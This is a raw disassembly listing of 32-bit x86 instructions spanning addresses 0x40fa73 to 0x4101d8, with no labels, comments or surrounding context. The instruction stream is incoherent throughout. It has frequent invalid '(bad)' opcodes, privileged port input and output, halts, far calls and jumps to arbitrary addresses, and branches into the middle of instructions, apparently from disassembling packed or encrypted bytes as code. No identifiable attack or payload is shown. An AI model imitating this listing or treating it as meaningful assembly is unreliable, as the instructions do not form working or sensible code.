  40fa73:	xor    DWORD PTR [edx+ebp*8],esp
  40fa76:	mov    edx,0x2b5c1049
  40fa7b:	call   0x6045:0x17cfdcae
  40fa82:	or     DWORD PTR [esp+eax*4+0x40],0xffffffa3
  40fa87:	inc    esp
  40fa88:	fisttp WORD PTR ss:[ebx-0x39]
  40fa8c:	mov    eax,0xa971c90a
  40fa91:	sbb    al,0x99
  40fa93:	sub    esp,DWORD PTR [ebx+0x719b4a73]
  40fa99:	loopne 0x40facd
  40fa9b:	sub    DWORD PTR [eax+ebx*1],0xffffffad
  40fa9f:	push   ebx
  40faa0:	xchg   edx,eax
  40faa1:	mov    edx,0x463ea7b
  40faa6:	adc    eax,0xeddd733
  40faab:	add    ch,BYTE PTR [esi+0x749bd601]
  40fab1:	pop    edx
  40fab2:	xor    BYTE PTR [edx+0x7c272257],0x39
  40fab9:	xchg   esi,eax
  40faba:	call   0xed3b:0x7e1efb9c
  40fac1:	fdivr  st(2),st
  40fac3:	out    0xb3,eax
  40fac5:	and    edx,esi
  40fac7:	jnp    0x40fac6
  40fac9:	clc    
  40faca:	pop    ds
  40facb:	cmp    BYTE PTR [esi-0x586f474d],0x73
  40fad2:	jg     0x40facf
  40fad4:	fadd   DWORD PTR [esi]
  40fad6:	adc    BYTE PTR [edx],al
  40fad8:	cld    
  40fad9:	hlt    
  40fada:	jae    0x40faf8
  40fadc:	sbb    al,0xe1
  40fade:	clc    
  40fadf:	jge    0x40fa96
  40fae1:	cli    
  40fae2:	mov    al,ds:0x92c5913c
  40fae7:	inc    edi
  40fae8:	push   ds
  40fae9:	aad    0x8d
  40faeb:	fst    DWORD PTR [eax+0x6a]
  40faee:	push   eax
  40faef:	fidivr WORD PTR [ebp-0x29]
  40faf2:	cmc    
  40faf3:	mov    edi,0x773edec7
  40faf8:	inc    esp
  40faf9:	pop    esi
  40fafa:	repz mov ebx,0x1baebd43
  40fb00:	daa    
  40fb01:	aaa    
  40fb02:	in     eax,0x9e
  40fb04:	aaa    
  40fb05:	gs xchg ebp,eax
  40fb07:	test   ebx,ebp
  40fb09:	mov    edi,0x17106d28
  40fb0e:	and    edx,0xffffffd2
  40fb11:	mov    WORD PTR [esi+0x6557e3e1],ss
  40fb17:	mov    dh,0x3f
  40fb19:	jge    0x40fac3
  40fb1b:	push   ds
  40fb1c:	(bad)  
  40fb1d:	mov    WORD PTR [esi],ds
  40fb1f:	jnp    0x40fafc
  40fb21:	adc    dh,bh
  40fb23:	pop    ds
  40fb24:	inc    ebx
  40fb25:	mov    bh,0xe7
  40fb27:	aam    0x4
  40fb29:	xor    BYTE PTR [esi+0x43],bh
  40fb2c:	dec    edi
  40fb2d:	mov    ah,BYTE PTR [ebx+0x25489d2d]
  40fb33:	imul   ebx,DWORD PTR [eax],0xf5bbd5c9
  40fb39:	mov    WORD PTR [ebp+0xe929aa5],gs
  40fb3f:	cmp    BYTE PTR [eax-0x3],ch
  40fb42:	lds    eax,FWORD PTR [ebp*2+0x64251c98]
  40fb49:	dec    ebp
  40fb4a:	push   ebx
  40fb4b:	pop    ds
  40fb4c:	frstor [eax]
  40fb4e:	(bad)  
  40fb4f:	mov    WORD PTR [eax+0x6900f138],cs
  40fb55:	sbb    ecx,esp
  40fb57:	pop    ds
  40fb58:	jbe    0x40faf8
  40fb5a:	adc    al,0x4a
  40fb5c:	dec    esp
  40fb5d:	jl     0x40fafe
  40fb5f:	push   0xb
  40fb61:	aas    
  40fb62:	shr    DWORD PTR [eax+0x2cc8acad],1
  40fb68:	repnz push ss
  40fb6a:	pop    esi
  40fb6b:	shl    BYTE PTR [edi],1
  40fb6d:	xor    BYTE PTR [bp+si-0x33b],0x50
  40fb73:	xchg   BYTE PTR [ebp+0x1d],dl
  40fb76:	lods   al,BYTE PTR ds:[esi]
  40fb77:	mov    edi,0x8ef243d2
  40fb7c:	push   ss
  40fb7d:	mov    bl,bh
  40fb7f:	int3   
  40fb80:	adc    eax,0x14887a56
  40fb85:	rcr    ecx,cl
  40fb87:	adc    DWORD PTR [ebp-0x45a70c23],ebp
  40fb8d:	js     0x40fb15
  40fb8f:	cld    
  40fb90:	or     esi,DWORD PTR [ecx]
  40fb92:	jge    0x40fbf7
  40fb94:	and    dl,bl
  40fb96:	and    dl,BYTE PTR [ecx+0x7b]
  40fb99:	mov    DWORD PTR [edx+0x2f],edi
  40fb9c:	sti    
  40fb9d:	mov    BYTE PTR [ecx+0x3f],ch
  40fba0:	loopne 0x40fc11
  40fba2:	pop    ds
  40fba3:	xchg   ebx,eax
  40fba4:	pop    ebx
  40fba5:	and    dh,bh
  40fba7:	adc    eax,0x1612ef4a
  40fbac:	pushw  0x18
  40fbaf:	fisttp DWORD PTR [ecx+esi*2+0x7c]
  40fbb3:	and    edi,DWORD PTR [ebx+0x72]
  40fbb6:	(bad)  
  40fbb7:	jb     0x40fb7e
  40fbb9:	shl    DWORD PTR [ebx],1
  40fbbb:	inc    edi
  40fbbc:	xchg   edi,eax
  40fbbd:	jl     0x40fc3c
  40fbbf:	xchg   esi,eax
  40fbc0:	sub    eax,0x744d55f9
  40fbc5:	fiadd  WORD PTR [edi]
  40fbc7:	adc    al,0x81
  40fbc9:	loop   0x40fc2d
  40fbcb:	dec    edx
  40fbcc:	pop    ebp
  40fbcd:	xlat   BYTE PTR ds:[ebx]
  40fbce:	add    dh,bl
  40fbd0:	inc    ebx
  40fbd1:	mov    ah,0xfb
  40fbd3:	push   ds
  40fbd4:	and    BYTE PTR [esi+0x70adda3f],cl
  40fbda:	push   0xb0e149e7
  40fbdf:	pop    esi
  40fbe0:	dec    ebx
  40fbe1:	aaa    
  40fbe2:	jle    0x40fc4d
  40fbe4:	sub    al,0x42
  40fbe6:	scas   al,BYTE PTR es:[edi]
  40fbe7:	popf   
  40fbe8:	clc    
  40fbe9:	out    dx,al
  40fbea:	lods   eax,DWORD PTR ds:[esi]
  40fbeb:	test   al,0x1f
  40fbed:	dec    ebp
  40fbee:	adc    eax,0x6c3c4e90
  40fbf3:	fiadd  DWORD PTR ds:[edi+0x7e4eb8eb]
  40fbfa:	add    eax,esp
  40fbfc:	sub    BYTE PTR [ebx],dl
  40fbfe:	mov    dl,0x65
  40fc00:	sahf   
  40fc01:	test   dl,bh
  40fc03:	adc    al,BYTE PTR [esi]
  40fc05:	in     eax,dx
  40fc06:	outs   dx,BYTE PTR ds:[esi]
  40fc07:	(bad)  
  40fc08:	bnd gs jp 0x40fc5c
  40fc0c:	push   es
  40fc0d:	sbb    DWORD PTR [ecx+eax*1+0x58],ebx
  40fc11:	xchg   ebp,eax
  40fc12:	push   ds
  40fc13:	push   esi
  40fc14:	inc    esi
  40fc15:	bound  edx,QWORD PTR [ebx+0x6d3295b1]
  40fc1b:	fsubr  st,st(6)
  40fc1d:	cmc    
  40fc1e:	aad    0xc9
  40fc20:	icebp  
  40fc21:	inc    esi
  40fc22:	test   esp,ecx
  40fc24:	nop
  40fc25:	or     DWORD PTR [eax],eax
  40fc27:	xor    eax,0xdfcb15f
  40fc2c:	rcr    bl,cl
  40fc2e:	jnp    0x40fc14
  40fc30:	outs   dx,DWORD PTR ds:[esi]
  40fc31:	pop    ds
  40fc32:	cmc    
  40fc33:	and    dh,BYTE PTR [edi+0x6899ba90]
  40fc39:	push   edx
  40fc3a:	fwait
  40fc3b:	cmc    
  40fc3c:	stos   DWORD PTR es:[edi],eax
  40fc3d:	test   al,0x8a
  40fc3f:	test   al,0xde
  40fc41:	(bad)  [eax+0x55]
  40fc44:	ja     0x40fc85
  40fc46:	stos   DWORD PTR es:[edi],eax
  40fc47:	sub    BYTE PTR [ecx+0x28],0x8c
  40fc4b:	push   ds
  40fc4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc4d:	cmc    
  40fc4e:	jo     0x40fc0d
  40fc50:	add    BYTE PTR [edx],al
  40fc52:	dec    edx
  40fc53:	retf   
  40fc54:	inc    ebx
  40fc55:	inc    ebp
  40fc56:	sbb    bl,BYTE PTR [edi+0x122dfcd0]
  40fc5c:	inc    edx
  40fc5d:	int    0xcc
  40fc5f:	dec    edi
  40fc60:	mov    ch,0x5
  40fc62:	or     DWORD PTR [eax-0x79],ebp
  40fc65:	test   eax,0x4a36655d
  40fc6a:	sbb    BYTE PTR [ebp+0x462178cf],ch
  40fc70:	pushf  
  40fc71:	cmp    DWORD PTR [edi],esi
  40fc73:	mov    dh,0x59
  40fc75:	dec    esi
  40fc76:	or     ch,ch
  40fc78:	and    bh,dl
  40fc7a:	ss fcomi st,st(7)
  40fc7d:	add    DWORD PTR [edi-0x228cfbd6],esi
  40fc83:	and    BYTE PTR [ecx-0x27bc84ff],ch
  40fc89:	sub    al,0xbd
  40fc8b:	lods   al,BYTE PTR ds:[esi]
  40fc8c:	or     al,0xda
  40fc8e:	adc    DWORD PTR [eax+0x19],eax
  40fc91:	fnstenv [edx-0x2e]
  40fc94:	fcom   DWORD PTR [ecx-0x11]
  40fc97:	retf   0xc377
  40fc9a:	mov    ebp,0xf62497bc
  40fc9f:	test   al,0xaf
  40fca1:	push   ebx
  40fca2:	daa    
  40fca3:	lahf   
  40fca4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fca5:	xchg   ebp,eax
  40fca6:	aad    0xae
  40fca8:	sub    eax,0xf6bdcbfc
  40fcad:	add    al,0xb5
  40fcaf:	pop    ds
  40fcb0:	push   ds
  40fcb1:	push   ss
  40fcb2:	pop    edx
  40fcb3:	loopne 0x40fd12
  40fcb5:	sbb    cl,BYTE PTR [ebx+ebx*8-0x60]
  40fcb9:	or     eax,0x25e6ddda
  40fcbe:	xchg   BYTE PTR [edi+0x71],dl
  40fcc1:	arpl   WORD PTR [edx-0x3997765d],si
  40fcc7:	jne    0x40fc4c
  40fcc9:	mov    bh,0xaa
  40fccb:	outs   dx,DWORD PTR ds:[esi]
  40fccc:	(bad)  
  40fccd:	xor    BYTE PTR [edx+esi*2],ch
  40fcd0:	jb     0x40fcdf
  40fcd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fcd3:	or     eax,0xb1dc9f89
  40fcd8:	mov    ds:0xea75e3a6,al
  40fcdd:	jae    0x40fcbc
  40fcdf:	test   DWORD PTR [ebx],edx
  40fce1:	inc    eax
  40fce2:	rcpps  xmm7,XMMWORD PTR es:[ebx+0x28]
  40fce7:	(bad)  
  40fce8:	out    0x8e,eax
  40fcea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fceb:	cmp    ebp,edx
  40fced:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fcee:	mov    ss,WORD PTR [edi-0x19]
  40fcf1:	rcl    esp,cl
  40fcf3:	pop    ss
  40fcf4:	mov    esp,0x14532d54
  40fcf9:	mov    ds:0x79b47cc2,al
  40fcfe:	pop    ebx
  40fcff:	fist   DWORD PTR [eax-0x4b10c72d]
  40fd05:	sbb    BYTE PTR [edx+0x6e],dh
  40fd08:	out    dx,al
  40fd09:	sar    BYTE PTR [eax],1
  40fd0b:	or     BYTE PTR [edx],al
  40fd0d:	lahf   
  40fd0e:	xor    DWORD PTR [ecx-0x3a],0xc23cbf94
  40fd15:	or     ecx,0xffffffa8
  40fd18:	ret    0xae32
  40fd1b:	dec    eax
  40fd1c:	leave  
  40fd1d:	adc    eax,0x5c8274d6
  40fd22:	jmp    0xa9f6c77b
  40fd27:	add    al,0x10
  40fd29:	xlat   BYTE PTR ds:[ebx]
  40fd2a:	xchg   ecx,eax
  40fd2b:	or     DWORD PTR [ecx+0x63],edx
  40fd2e:	fisubr WORD PTR [eax]
  40fd30:	es or  edi,ebx
  40fd33:	or     DWORD PTR [ecx+0x6b],ebx
  40fd36:	pop    eax
  40fd37:	(bad)  
  40fd38:	fstp   DWORD PTR [eax+edx*8-0xe6c2cc0]
  40fd3f:	sbb    cl,BYTE PTR [edx]
  40fd41:	sub    ah,dh
  40fd43:	mov    eax,0xfd2d243f
  40fd48:	push   esp
  40fd49:	das    
  40fd4a:	xchg   ecx,eax
  40fd4b:	sub    DWORD PTR [edi+0x20],ecx
  40fd4e:	push   ecx
  40fd4f:	out    0x91,eax
  40fd51:	cli    
  40fd52:	inc    edx
  40fd53:	and    DWORD PTR [ecx],0x8b4f391c
  40fd59:	daa    
  40fd5a:	inc    ebp
  40fd5b:	mov    eax,0x255cb021
  40fd60:	xor    al,0x90
  40fd62:	push   esp
  40fd63:	mov    ebp,0x47cb50cb
  40fd68:	push   eax
  40fd69:	xchg   ebx,eax
  40fd6a:	fist   WORD PTR [ebx+0x38]
  40fd6d:	int    0x74
  40fd6f:	xchg   DWORD PTR [ebp-0x8],ebx
  40fd72:	adc    al,BYTE PTR [ecx+0x5f]
  40fd75:	cmp    al,0x54
  40fd77:	in     eax,dx
  40fd78:	jns    0x40fdd8
  40fd7a:	xchg   BYTE PTR [edi+0x40],dh
  40fd7d:	sbb    bh,BYTE PTR [edx]
  40fd7f:	in     eax,0xa5
  40fd81:	lahf   
  40fd82:	outs   dx,DWORD PTR ds:[esi]
  40fd83:	int    0x9b
  40fd85:	adc    ebp,ebx
  40fd87:	jb     0x40fd7f
  40fd89:	cmp    ecx,edx
  40fd8b:	sbb    DWORD PTR [edi+0x202a1ae1],0x3a
  40fd92:	mov    esp,DWORD PTR [ebp-0x78]
  40fd95:	add    al,0x9f
  40fd97:	dec    ecx
  40fd98:	and    BYTE PTR [ebx+0x1ecf363f],dh
  40fd9e:	cdq    
  40fd9f:	ins    DWORD PTR es:[edi],dx
  40fda0:	pop    ebx
  40fda1:	adc    al,0xed
  40fda3:	cs scas eax,DWORD PTR es:[edi]
  40fda5:	mov    ebx,0xa9af3ed0
  40fdaa:	add    eax,0x11f92460
  40fdaf:	out    0xa7,al
  40fdb1:	mov    ebx,DWORD PTR [eax+0x69]
  40fdb4:	sbb    BYTE PTR [edi+0x4d],ch
  40fdb7:	cmc    
  40fdb8:	icebp  
  40fdb9:	xor    eax,0x5eb39cff
  40fdbe:	es pop esp
  40fdc0:	adc    esi,edx
  40fdc2:	push   0xffffffdd
  40fdc4:	jecxz  0x40fe3b
  40fdc6:	cs sahf 
  40fdc8:	pop    es
  40fdc9:	cmp    al,0x15
  40fdcb:	lahf   
  40fdcc:	ror    BYTE PTR [ecx],0xe2
  40fdcf:	xor    eax,0x5679ce12
  40fdd4:	out    dx,eax
  40fdd5:	and    BYTE PTR ds:0xfa82d3ee,ch
  40fddb:	pop    ds
  40fddc:	lock arpl WORD PTR [ecx],di
  40fddf:	xchg   ebp,eax
  40fde0:	and    ebx,esi
  40fde2:	(bad)  
  40fde3:	ror    DWORD PTR [ecx+0xa],cl
  40fde6:	adc    eax,0xe2439d32
  40fdeb:	and    esp,DWORD PTR [esp+ecx*1-0x708641d6]
  40fdf2:	in     eax,0x8a
  40fdf4:	add    ebp,DWORD PTR [edx]
  40fdf6:	(bad)  
  40fdf7:	in     eax,0x11
  40fdf9:	mov    es,WORD PTR [ebx-0x5d]
  40fdfc:	sbb    bl,BYTE PTR [ecx]
  40fdfe:	jnp    0x40fe18
  40fe00:	lds    ebp,FWORD PTR [edx-0x50]
  40fe03:	adc    dh,BYTE PTR [ebx-0x28]
  40fe06:	div    BYTE PTR [eax-0x70bf5e26]
  40fe0c:	sbb    eax,0x56508647
  40fe11:	out    dx,eax
  40fe12:	cdq    
  40fe13:	(bad)  
  40fe14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe15:	jns    0x40fe11
  40fe17:	mov    edx,ss
  40fe19:	sub    DWORD PTR [esi-0x4b5d010a],eax
  40fe1f:	xchg   edi,eax
  40fe20:	aaa    
  40fe21:	shr    DWORD PTR [ecx+0x1dce9fd3],cl
  40fe27:	inc    DWORD PTR [ecx-0x75]
  40fe2a:	dec    esp
  40fe2b:	cli    
  40fe2c:	push   ecx
  40fe2d:	push   ds
  40fe2e:	in     eax,0x6e
  40fe30:	addr16 icebp 
  40fe32:	out    dx,eax
  40fe33:	es call 0xafc9f3d7
  40fe39:	jle    0x40fe2a
  40fe3b:	cmp    BYTE PTR [ebx+0x3c18076],0x12
  40fe42:	sar    DWORD PTR [esi],0x44
  40fe45:	xor    ch,BYTE PTR [ecx+edx*1+0x35f8ec2a]
  40fe4c:	push   esi
  40fe4d:	mov    edx,DWORD PTR [ebp-0x5d]
  40fe50:	sub    BYTE PTR [ebx-0x4312f6da],0x99
  40fe57:	jns    0x40fdf0
  40fe59:	mov    ebp,0xa7962190
  40fe5e:	hlt    
  40fe5f:	mov    esp,0xe26b6f57
  40fe64:	pop    es
  40fe65:	mov    cl,0x1
  40fe67:	push   es
  40fe68:	es je  0x40fe6a
  40fe6b:	dec    esp
  40fe6c:	cmp    ebx,DWORD PTR [edx-0x4c]
  40fe6f:	mov    cl,0xa7
  40fe71:	push   edi
  40fe72:	dec    edi
  40fe73:	or     BYTE PTR [ecx],al
  40fe75:	add    ebp,DWORD PTR [eax+0x3791a6e3]
  40fe7b:	cmp    bl,BYTE PTR [ebp-0x1c]
  40fe7e:	xchg   ebx,eax
  40fe7f:	loop   0x40fe73
  40fe81:	cmp    ah,0xac
  40fe84:	mov    ds:0xc77b92d8,al
  40fe89:	aas    
  40fe8a:	inc    esp
  40fe8b:	push   0x9c595db5
  40fe90:	fsub   DWORD PTR [esi]
  40fe92:	ret    0xac88
  40fe95:	xor    BYTE PTR [esi],al
  40fe97:	xor    al,BYTE PTR [esi-0x45]
  40fe9a:	gs xchg ebp,eax
  40fe9c:	push   esp
  40fe9d:	and    DWORD PTR [edi],ebx
  40fe9f:	shl    DWORD PTR [eax+0x66d81942],1
  40fea5:	enter  0x8a79,0xf8
  40fea9:	push   ds
  40feaa:	std    
  40feab:	sbb    ebp,DWORD PTR [eax]
  40fead:	mov    cl,0x57
  40feaf:	mov    eax,0xb000bb74
  40feb4:	jl     0x40feea
  40feb6:	push   0x35
  40feb8:	cmp    bh,0x96
  40febb:	enter  0x6918,0xb3
  40febf:	sbb    BYTE PTR [edx-0x69fcfd76],al
  40fec5:	sbb    ch,BYTE PTR [eax+0x622ebf8b]
  40fecb:	adc    BYTE PTR [eax+0x6d1b91fe],cl
  40fed1:	outs   dx,BYTE PTR ds:[esi]
  40fed2:	pop    ecx
  40fed3:	jnp    0x40ff45
  40fed5:	or     DWORD PTR [eax+0x79eb3b5b],edx
  40fedb:	repnz xchg edx,ebx
  40fede:	xor    al,0x9e
  40fee0:	aaa    
  40fee1:	cmp    eax,0x6c24e795
  40fee6:	int    0x2d
  40fee8:	stos   BYTE PTR es:[edi],al
  40fee9:	add    ah,BYTE PTR [esi+0xc]
  40feec:	mov    dl,0xfb
  40feee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40feef:	das    
  40fef0:	(bad)  
  40fef1:	and    ecx,DWORD PTR [eax+0x619da737]
  40fef7:	test   BYTE PTR [eax+0x681530d9],dl
  40fefd:	enter  0x930e,0x98
  40ff01:	je     0x40ff4d
  40ff03:	fs icebp 
  40ff05:	mov    ebp,0xd98358f7
  40ff0a:	gs ss scas eax,DWORD PTR es:[edi]
  40ff0d:	dec    edx
  40ff0e:	(bad)  
  40ff0f:	pop    ss
  40ff10:	push   es
  40ff11:	adc    eax,0x7a837404
  40ff16:	sar    BYTE PTR [esi-0x55],1
  40ff19:	test   al,0x71
  40ff1b:	sti    
  40ff1c:	or     edi,DWORD PTR [edx-0x6022fdfc]
  40ff22:	ins    DWORD PTR es:[edi],dx
  40ff23:	pop    esi
  40ff24:	and    DWORD PTR [ebp-0x33],esp
  40ff27:	repz mov ds:0x83d9f305,al
  40ff2d:	mov    ebx,0xb8a14fd3
  40ff32:	jl     0x40ff7e
  40ff34:	inc    esp
  40ff35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff36:	jns    0x40feea
  40ff38:	les    ebx,FWORD PTR ds:0xbd18c416
  40ff3e:	lods   eax,DWORD PTR ds:[esi]
  40ff3f:	jecxz  0x40fed8
  40ff41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff42:	scas   eax,DWORD PTR es:[edi]
  40ff43:	cmp    BYTE PTR [ebx-0x19],al
  40ff46:	add    BYTE PTR [ecx-0x6c75ecb0],dh
  40ff4c:	pop    ss
  40ff4d:	xchg   ecx,eax
  40ff4e:	cmp    al,0xcb
  40ff50:	std    
  40ff51:	(bad)  
  40ff52:	push   cs
  40ff53:	fwait
  40ff54:	sar    BYTE PTR [edi],cl
  40ff56:	or     ch,BYTE PTR [esi+0x3633837d]
  40ff5c:	add    al,0xe
  40ff5f:	in     eax,0x8e
  40ff61:	das    
  40ff62:	add    ebp,DWORD PTR [esi+eiz*2+0x31]
  40ff66:	mov    esi,0xaf7c38f1
  40ff6b:	rcl    DWORD PTR [edi],1
  40ff6d:	cmp    al,0x3e
  40ff6f:	ins    DWORD PTR es:[edi],dx
  40ff70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff71:	jp     0x40ff09
  40ff73:	push   0x9
  40ff75:	dec    edx
  40ff76:	popf   
  40ff77:	jmp    0x59dd:0xbcdbfb21
  40ff7e:	adc    dh,BYTE PTR [edi]
  40ff80:	loope  0x40ff1f
  40ff82:	sar    BYTE PTR [eax-0xe32c5c0],1
  40ff88:	dec    edi
  40ff89:	mul    DWORD PTR [ebx-0x2f975968]
  40ff8f:	mov    al,0xfe
  40ff91:	cdq    
  40ff92:	xor    al,0xff
  40ff94:	mov    edx,0x2089a69
  40ff99:	pop    ebx
  40ff9a:	stos   BYTE PTR es:[edi],al
  40ff9b:	mov    dh,0x36
  40ff9d:	xchg   ebx,eax
  40ff9e:	popf   
  40ff9f:	in     eax,0x13
  40ffa1:	hlt    
  40ffa2:	push   ds
  40ffa3:	mov    ebp,fs
  40ffa5:	aam    0xe5
  40ffa7:	mov    ebx,0xe76533d4
  40ffac:	ret    
  40ffad:	in     eax,0xac
  40ffaf:	cmp    ecx,DWORD PTR [ebx+0x6eccc1eb]
  40ffb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ffb6:	push   ss
  40ffb7:	xor    ebx,ecx
  40ffb9:	or     ah,ah
  40ffbb:	fdiv   DWORD PTR [eax]
  40ffbd:	add    ecx,DWORD PTR [edx+0xe97c950]
  40ffc3:	mov    DWORD PTR [ebx-0x70],edx
  40ffc6:	js     0x40ffa5
  40ffc8:	push   esp
  40ffc9:	and    DWORD PTR [ebp+esi*2-0x3e6730bb],eax
  40ffd0:	in     eax,dx
  40ffd1:	or     BYTE PTR [ebx+0x4340ac83],bl
  40ffd7:	jmp    0x7fd580dd
  40ffdc:	cmp    DWORD PTR [esi],ebp
  40ffde:	stos   DWORD PTR es:[edi],eax
  40ffdf:	mov    DWORD PTR [ebp+0x3bedd325],edx
  40ffe5:	outs   dx,DWORD PTR ds:[esi]
  40ffe6:	pop    edi
  40ffe7:	jmp    0x93eb920c
  40ffec:	in     eax,0xf0
  40ffee:	out    dx,eax
  40ffef:	lea    esi,[ebx-0x5]
  40fff2:	jmp    0x410032
  40fff4:	sbb    ebp,DWORD PTR [ebx+0x6a2c3c35]
  40fffa:	js     0x410041
  40fffc:	je     0x410010
  40fffe:	mov    bl,0x87
  410000:	cli    
  410001:	icebp  
  410002:	nop
  410003:	fadd   st,st(2)
  410005:	stos   BYTE PTR es:[edi],al
  410006:	xlat   BYTE PTR es:[ebx]
  410008:	jae    0x40ffd1
  41000a:	push   0x9190d50b
  41000f:	sbb    ebx,DWORD PTR [ebx]
  410011:	nop
  410012:	out    dx,al
  410013:	in     eax,0x6f
  410015:	dec    ebp
  410016:	adc    ecx,0x5
  410019:	shl    dl,1
  41001b:	lock adc dh,BYTE PTR [bx+0x5f]
  410020:	imul   DWORD PTR [edx]
  410022:	mov    al,ds:0x78db4c58
  410027:	dec    ecx
  410028:	fld    QWORD PTR [edx+edi*2]
  41002b:	jo     0x41000a
  41002d:	mov    eax,0x66f79989
  410032:	rcr    DWORD PTR [eax+0x3475dc53],1
  410038:	call   esp
  41003a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41003b:	pop    esi
  41003c:	pop    ebx
  41003d:	mov    al,0xb7
  41003f:	xchg   DWORD PTR ds:0x3fbfaf1d,esi
  410045:	sub    al,0x9e
  410047:	aas    
  410048:	call   0x65960cfd
  41004d:	mov    cl,0x66
  41004f:	ss jle 0x40ffd3
  410052:	hlt    
  410053:	push   esp
  410054:	inc    esi
  410055:	lods   eax,DWORD PTR ds:[esi]
  410056:	fimul  WORD PTR [ecx-0x6e]
  410059:	pcmpgtw mm0,QWORD PTR [esp+edi*4+0x4e2180b6]
  410061:	add    esi,DWORD PTR [ecx]
  410063:	inc    edx
  410064:	or     al,0xbe
  410066:	mov    ah,0x3e
  410068:	popa   
  410069:	out    0x9e,al
  41006b:	in     eax,0xf9
  41006d:	inc    eax
  41006e:	fsub   st(0),st
  410070:	add    BYTE PTR [edx-0x66],ah
  410073:	xchg   edx,eax
  410074:	test   DWORD PTR [ecx+esi*2-0xdf7606b],esi
  41007b:	sub    ecx,edx
  41007d:	pop    ds
  41007e:	push   ebx
  41007f:	ja     0x410069
  410081:	in     eax,dx
  410082:	inc    esp
  410083:	and    DWORD PTR [edi],edi
  410085:	jmp    0x61ff:0x646dcaa
  41008c:	jl     0x410050
  41008e:	jmp    0x41003d
  410090:	rol    BYTE PTR [edi-0xbceefa6],cl
  410096:	aam    0xa8
  410098:	or     eax,0x4a319a6a
  41009d:	mov    al,ds:0x4529e02f
  4100a2:	or     BYTE PTR [eax-0x13bd2aa2],0x51
  4100a9:	shl    DWORD PTR ds:0xd860c511,cl
  4100af:	jl     0x410073
  4100b1:	add    ch,BYTE PTR [esi+0x56]
  4100b4:	cmp    eax,0x8205d11a
  4100b9:	test   eax,0xdfac3214
  4100be:	or     DWORD PTR [bx+di+0x25cf],esi
  4100c3:	inc    ebp
  4100c4:	xchg   esi,eax
  4100c5:	adc    bh,BYTE PTR [ecx+ecx*4+0x4b]
  4100c9:	add    BYTE PTR [edi],ch
  4100cb:	inc    ecx
  4100cc:	jmp    0x2397f8e
  4100d1:	shl    BYTE PTR ds:0xf25b679f,0xba
  4100d8:	xor    ah,bl
  4100da:	popa   
  4100db:	fimul  DWORD PTR [edi+0x64]
  4100de:	sbb    edx,DWORD PTR [ebp-0x48]
  4100e1:	not    edi
  4100e3:	and    eax,0xe1246f19
  4100e8:	leave  
  4100e9:	lea    ebx,[esi]
  4100eb:	sbb    eax,0x382e1091
  4100f0:	jns    0x4100bc
  4100f2:	mov    bl,0x8c
  4100f4:	mov    ecx,0xde61b888
  4100f9:	cmp    eax,0x57f5844d
  4100fe:	popa   
  4100ff:	dec    esp
  410100:	ret    0xbd33
  410103:	jb     0x410158
  410105:	mov    dh,0xdf
  410107:	cmp    BYTE PTR [edx+0x4d],0x60
  41010b:	jge    0x41015b
  41010d:	and    ecx,edx
  41010f:	inc    edx
  410110:	mov    bh,0xcb
  410112:	jge    0x410144
  410114:	jle    0x4100de
  410116:	je     0x410109
  410118:	dec    edi
  410119:	pop    eax
  41011a:	adc    bh,BYTE PTR [ecx-0x5c51da95]
  410120:	sbb    BYTE PTR [ecx+0x7f],ah
  410123:	sbb    DWORD PTR [ebx],edx
  410125:	mov    BYTE PTR [esi+0xa],ah
  410128:	jg     0x4100f1
  41012a:	jg     0x410179
  41012c:	push   0x66
  41012e:	das    
  41012f:	push   ebx
  410130:	xor    ch,BYTE PTR [eax]
  410132:	dec    edx
  410133:	mov    eax,ds:0x2fd0cb77
  410138:	pop    ebp
  410139:	(bad)  
  41013a:	xor    esi,ecx
  41013c:	mov    DWORD PTR [ecx],esp
  41013e:	iret   
  41013f:	push   es
  410140:	cwde   
  410141:	pop    edi
  410142:	add    eax,0x36dc450d
  410147:	nop
  410148:	and    DWORD PTR [ebx],0xfffffffb
  41014b:	test   eax,0xee5225b2
  410150:	pop    ss
  410151:	push   ebp
  410152:	js     0x410119
  410154:	je     0x410150
  410156:	std    
  410157:	mov    al,ds:0xa82162a3
  41015c:	mov    esp,0x4683de77
  410161:	fwait
  410162:	jo     0x4100ec
  410164:	or     ch,BYTE PTR [ecx-0x2b]
  410167:	call   0xbf700594
  41016c:	aas    
  41016d:	sub    bh,BYTE PTR [ebx+ebx*1-0x4bea3166]
  410174:	push   ss
  410175:	mov    ah,0x8
  410177:	icebp  
  410178:	pop    esp
  410179:	shl    bl,cl
  41017b:	nop
  41017c:	fisttp QWORD PTR [esi-0x4b]
  41017f:	and    al,0x96
  410181:	add    DWORD PTR [ebx-0x26],ebx
  410184:	scas   eax,DWORD PTR es:[edi]
  410185:	push   ss
  410186:	xchg   edi,eax
  410187:	dec    ebx
  410188:	push   edx
  410189:	and    eax,0xd2387b37
  41018e:	pop    esp
  41018f:	or     eax,0x452ff399
  410194:	out    0x3b,al
  410196:	mov    eax,ds:0xb932c212
  41019b:	push   ds
  41019c:	loope  0x4101a3
  41019e:	cmc    
  41019f:	mov    eax,ds:0x119284a1
  4101a4:	std    
  4101a5:	push   esi
  4101a6:	sbb    DWORD PTR [ebp+edx*8-0x19e3b634],ecx
  4101ad:	(bad)  
  4101ae:	out    dx,al
  4101af:	or     eax,0xefd846da
  4101b4:	adc    eax,0xa9a3888c
  4101b9:	cmc    
  4101ba:	xor    edx,ecx
  4101bc:	sbb    DWORD PTR [esi],esp
  4101be:	mov    WORD PTR [edi+0x28],?
  4101c1:	xchg   DWORD PTR [esp+ebp*4-0x55],eax
  4101c5:	lock add DWORD PTR [edi+0x223a6d18],esi
  4101cc:	enter  0x312,0xb3
  4101d0:	aad    0x32
  4101d2:	fld    TBYTE PTR [eax-0x30]
  4101d5:	arpl   bx,si
  4101d7:	lahf   
  4101d8:	dec    edi
